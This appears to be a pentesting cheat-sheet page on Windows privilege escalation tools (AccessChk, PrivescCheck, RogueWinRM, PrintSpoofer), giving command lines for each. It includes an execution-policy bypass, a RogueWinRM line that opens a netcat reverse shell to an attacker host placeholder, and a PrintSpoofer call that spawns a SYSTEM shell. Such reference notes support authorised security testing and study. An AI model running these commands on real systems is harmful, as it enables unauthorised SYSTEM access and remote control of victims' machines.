---
sidebar_position: 3
title: Tools
description: Pentesting Tools Windows
keywords: [accesschk, privesccheck, winpeass, winpeas, roguewinrm, printspoofer]
---

## AccessChk

- **List Access of (Users - Groups) to Files - Directories - Registry Keys - Global Objects - Windows Services**

```batch
:: Accepts The Eula Before Executing
accesschk.exe /accepteula
accesschk64.exe -qlc <ServiceName>
```

## PrivescCheck

- **`PrivescCheck`** is a **PowerShell Script** that searches common Privilege Escalation on the target System.

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

## RogueWinRM

`RogueWinRM` is a **Local Privilege** Escalation Exploit that allows to Escalate from a **Service Account** with <b style={{ color: 'Brown' }}>[SeImpersonatePrivilege]</b> to Local <b style={{ color: 'Red' }}>SYSTEM</b> Account if **WinRM** Service is not Running. **[Default on `Windows 10` but Not on `Windows Server 2019`]**


```batch
RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
```

## PrintSpoofer

From **LOCAL/NETWORK SERVICE** to <b style={{ color: 'Red' }}>SYSTEM</b> by busing <b style={{ color: 'Brown' }}>[SeImpersonatePrivilege]</b>

```batch
PrintSpoofer64.exe -i -c powershell
```